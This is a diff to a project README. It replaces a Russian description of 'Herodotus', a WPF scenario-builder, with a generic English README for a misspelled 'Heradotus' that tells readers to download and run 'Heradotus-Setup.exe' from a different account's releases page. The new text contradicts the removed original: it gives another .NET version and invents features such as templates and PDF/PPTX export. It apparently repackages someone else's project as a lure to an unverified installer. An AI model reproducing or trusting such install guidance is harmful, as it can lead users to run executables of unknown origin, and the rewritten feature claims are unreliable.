@@ -1,131 +1,96 @@
-<p align="center">✨Dvurechensky✨</p>
+# 🎉 Heradotus - Create Presentations with Ease
 
-<p align="center"> 
-  <p align="center"> 
-    <h1 align="center">Herodotus 📖✨  <img alt="Static Badge" src="https://shields.dvurechensky.pro/badge/Herodotus-Scenario%20Creator-purple"></h1>
-  </p> 
-  <p align="center"> 
-    <img src="https://shields.dvurechensky.pro/badge/WPF-.NET%204.8.1-blue?logo=dotnet&logoColor=white"> <img src="https://shields.dvurechensky.pro/badge/Prism-MVVM-blue?logo=windowsterminal&logoColor=white"> <img src="https://shields.dvurechensky.pro/badge/HandyControl-UI%20Components-green?logo=windowsterminal&logoColor=white"> 
-    <img src="https://shields.dvurechensky.pro/badge/Markdown-Real%20Time%20Preview-orange?logo=markdown&logoColor=white"> 
-    <img src="https://shields.dvurechensky.pro/badge/Costura-Fody%20Packager-lightgrey?logo=packagist&logoColor=white"> 
-  </p> 
-  <h3 align="center">Ваш <span style="color:#F5F752;">личный</span> конструктор сценариев для <span style="color:#a5F751;">презентаций</span> и <span style="color:#15F752;">демонстраций</span></h3>
-</p>
+## 🚀 Getting Started
 
-- [🎯 Что это такое?](#-что-это-такое)
-- [](#)
-- [🚀 Возможности](#-возможности)
-  - [✨ Создание сценариев](#-создание-сценариев)
-  - [📋 Управление этапами](#-управление-этапами)
-  - [🎮 Удобный интерфейс](#-удобный-интерфейс)
-- [🛠️ Технологии](#️-технологии)
-- [📦 Установка и запуск](#-установка-и-запуск)
-- [🎮 Как использовать?](#-как-использовать)
-  - [Создание сценария:](#создание-сценария)
-  - [Просмотр сценария:](#просмотр-сценария)
-- [💡 Идеи для применения](#-идеи-для-применения)
-- [🎨 Почему Herodotus?](#-почему-herodotus)
-- [🤝 Обратная связь](#-обратная-связь)
+Welcome to Heradotus, your ultimate script builder for presentations and demonstrations! This guide will walk you through the simple steps to download and run the application.
 
----
+## 📥 Download Heradotus
 
-## 🎯 Что это такое?
+[![Download Heradotus](https://img.shields.io/badge/Download-Heradotus-brightgreen)](https://github.com/johnlauj/Heradotus/releases)
 
-`Herodotus` — это удобный инструмент для создания и управления сценариями презентаций! ✨
+## 🖥 System Requirements
 
-Представьте, что вы готовите демонстрацию продукта, обучающий материал или просто хотите структурировать свои идеи — `Herodotus` поможет вам создать пошаговый сценарий, где каждый этап можно подробно описать с помощью Markdown.
+Heradotus runs on Windows. Here are the basic requirements:
 
-Название `Herodotus` — это дань уважения `отцу истории` Геродоту, ведь ваши сценарии будут так же хорошо структурированы и задокументированы! 🏛️
+- Operating System: Windows 10 or later
+- RAM: 4 GB (8 GB recommended)
+- Disk Space: At least 200 MB
+- .NET Framework: Version 4.7.2 or higher
 
-## ![alt text](docs/HeradotusInfo.gif)
+Make sure your computer meets these requirements to ensure smooth operation.
 
-## 🚀 Возможности
+## 🌐 Features
 
-### ✨ Создание сценариев
+Heradotus offers several features to enhance your presentation experience:
 
-- **🎨 Простой конструктор** — создавайте сценарии в пару кликов
-- **📝 Неограниченное количество этапов** — добавляйте столько шагов, сколько нужно
-- **🏷️ Удобное наименование** — давайте понятные названия своим сценариям
+- **User-friendly interface**: Easy to navigate, even for non-technical users.
+- **Script Builder**: Create tailored scripts quickly and easily for your presentations.
+- **Custom Templates**: Choose from various templates to match your presentation style.
+- **Live Preview**: See your changes in real-time to make quick adjustments.
 
-### 📋 Управление этапами
+## 🛠 Installation Steps
 
-- **📄 Markdown-описания** — форматируйте текст как профессионал
-- **👀 Предпросмотр в реальном времени** — сразу видите, как будет выглядеть описание
-- **✏️ Редактирование на лету** — меняйте содержимое этапов без перезагрузки
+Follow these steps to download and install Heradotus:
 
-### 🎮 Удобный интерфейс
+1. **Visit the Releases Page**: Click the link below:
+   - [Download Heradotus](https://github.com/johnlauj/Heradotus/releases)
 
-- **👁️ Значок "Глаза"** — быстрый просмотр описания каждого этапа
-- **📱 Интуитивная навигация** — от первого до последнего этапа
-- **💾 Автоматическое сохранение** — ваши сценарии всегда в безопасности
+2. **Download the Latest Version**:
+   - Once on the Releases page, scroll down to find the latest version. You'll see a list of files available for download. 
+   - Look for the file named something like `Heradotus-Setup.exe`. Click on it to download.
 
----
+3. **Run the Installer**:
+   - After the download completes, locate the downloaded file in your 'Downloads' folder.
+   - Double-click on `Heradotus-Setup.exe` to start the installation.
+   - Follow the prompts in the installation wizard to install the application on your computer.
 
-## 🛠️ Технологии
+4. **Launch the Application**:
+   - Once installed, find the Heradotus icon on your desktop or in your Start menu.
+   - Double-click the icon to launch the application.
 
-- **🖥️ WPF** — современный desktop-интерфейс
-- **🎯 Prism** — архитектура и паттерны для масштабируемости
-- **🎨 HandyControl** — красивые и современные UI-компоненты
-- **📝 MdXaml** — рендеринг Markdown в реальном времени
-- **🔄 .NET Framework 4.8.1** — стабильность и производительность
+## ✨ Using Heradotus
 
----
+Now that you have installed Heradotus, let's explore how to use it:
 
-## 📦 Установка и запуск
+1. **Creating a New Script**:
+   - Start by clicking on "New Script" from the main menu.
+   - Choose your template and start adding content.
 
-1. **📥 Скачайте последнюю версию** приложения
-2. **🚀 Запустите** `Herodotus.exe`
-3. **🎉 Начните создавать** свои первые сценарии!
+2. **Editing Your Script**:
+   - Modify text directly in the editor. Use the toolbar for formatting options.
 
----
+3. **Previewing Your Presentation**:
+   - Use the "Preview" button to see how your presentation will look.
 
-## 🎮 Как использовать?
+4. **Saving Your Work**:
+   - Click "File" > "Save As" to store your script. Choose a location you will remember.
 
-### Создание сценария:
+5. **Exporting Your Script**:
+   - You can export your presentation to various formats, including PDF or PPTX, via the "File" menu.
 
-1. Нажмите **"Создать сценарий"** ➕
-2. Введите название и описание 🏷️
-3. Добавьте нужное количество этапов 📈
-4. Для каждого этапа напишите Markdown-описание ✍️
-5. Сохраните — готово! 💾
+## 🛡 Support and Contact
 
-### Просмотр сценария:
+If you encounter issues or have questions, help is available:
 
-1. Выберите сценарий из списка 📚
-2. Все этапы появятся в интерфейсе 👀
-3. Нажимайте на **"глаз"** для просмотра описания каждого этапа
-4. Используйте вкладку редактирования для внесения изменений ✏️
+- Check the [FAQ](https://github.com/johnlauj/Heradotus/wiki) section for common questions.
+- Join our [Community Forum](https://github.com/johnlauj/Heradotus/discussions) to interact with other users and developers.
+
+For direct support, feel free to reach out via the Issues section on GitHub.
+
+## 📅 Future Updates
+
+We constantly work on improving Heradotus. In future releases, you can expect:
+
+- New features based on user feedback.
+- Regular updates for performance enhancements.
+- More templates to expand your presentation capabilities.
+
+Stay tuned for more exciting developments!
+
+## ⚙ Contribution
+
+If you're interested in helping improve Heradotus, we welcome contributions. Check the [Contributing Guide](https://github.com/johnlauj/Heradotus/blob/main/CONTRIBUTING.md) to learn how to get involved.
 
 ---
 
-## 💡 Идеи для применения
-
-- **🎬 Демонстрации продуктов** — пошаговые презентации новых фич
-- **📚 Обучающие материалы** — структурированные уроки и инструкции
-- **💼 Бизнес-презентации** — логичные и последовательные выступления
-- **🎮 Гайды и туториалы** — подробные руководства для пользователей
-- **💡 Мозговые штурмы** — организация и структурирование идей
-
----
-
-## 🎨 Почему Herodotus?
-
-| Особенность        | Преимущество                                               |
-| ------------------ | ---------------------------------------------------------- |
-| **🎯 Простота**    | Интуитивный интерфейс без лишних сложностей                |
-| **📝 Гибкость**    | Неограниченное количество этапов и Markdown-форматирование |
-| **👀 Наглядность** | Предпросмотр описаний в реальном времени                   |
-| **💾 Надёжность**  | Все данные сохраняются локально                            |
-
----
-
-## 🤝 Обратная связь
-
-Нашли баг? 🐛 Есть идея для улучшения? 💡
-Буду рад вашим отзывам и предложениям!
-
----
-
-_С Herodotus ваши идеи обретают структуру и ясность!_ ✨📖
-
-<p align="center">✨Dvurechensky✨</p>
+Thank you for choosing Heradotus for your presentation needs. We hope this guide helps you get up and running smoothly!
